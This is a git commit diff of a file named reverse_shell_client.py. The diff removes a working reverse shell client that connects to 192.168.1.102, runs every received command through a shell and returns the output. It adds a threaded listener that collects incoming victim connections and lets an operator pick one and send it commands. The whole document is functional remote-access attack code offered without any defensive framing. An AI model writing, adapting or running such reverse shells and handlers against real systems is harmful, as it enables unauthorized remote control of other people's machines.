35b02e74284984222b82c23f7d9d508b1d4d62bc
AGNEESHWARAN <32772085+AGNEESHWARAN@users.noreply.github.com>
2021-07-27 23:22:39 +0530

    Update reverse_shell_client.py

--- reverse_shell_client.py
+++ reverse_shell_client.py
@@ -1,27 +1,48 @@
-import subprocess,socket,os
+import threading
+import socket,time
 
-s=socket.socket()
+s = socket.socket()
 
-def connect_serv():
-	try:
-		s.connect(('192.168.1.102',9999))
-	except:
-		print("reconnecting!!")
-		connect_serv()
+s.bind(('',9992))
 
-connect_serv()
-while True:
-	data = s.recv(20480).decode("utf-8")
+s.listen(5)
 
-	if 'cd' in data[0:2]:
-		os.chdir(data[3:])
-		s.send(str.encode("directory changed!"))
-		continue
-	if len(data) > 0:
-		cmd = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-		output_byte = cmd.stdout.read() + cmd.stderr.read()
-		output_str = str(output_byte,"utf-8")
-		currentWD = os.getcwd() + "> "
+add_lis=[]
+conn_lis=[]
+
+def accept_conn():
+	while True:
+		print("waiting")
+		conn,add= s.accept()
+		#print(add)
+		add_lis.append(add)
+		conn_lis.append(conn)
+
+
+def do_something():
+	while True:
+		print("LIST OF CONNECTIONS :")
 		
-		s.send(str.encode(output_str+currentWD))
+		for i in add_lis:
+			print(add_lis.index(i),i[0],i[1])
+		selection = input(" select connection >>>")
+		if selection =='skip':
+			continue
+		conn = conn_lis[int(selection)]
+		
+		while True:
+			cmd = input('>>')
+			conn.sendall(str.encode(cmd))
+			response =str(conn.recv(20480),"utf-8")
+			print(response)		
+t = threading.Thread(target=accept_conn)
+t1=threading.Thread(target=do_something)
 
+
+
+t.start()
+t1.start()
+t1.join()
+t.join()
+
+print("end..")
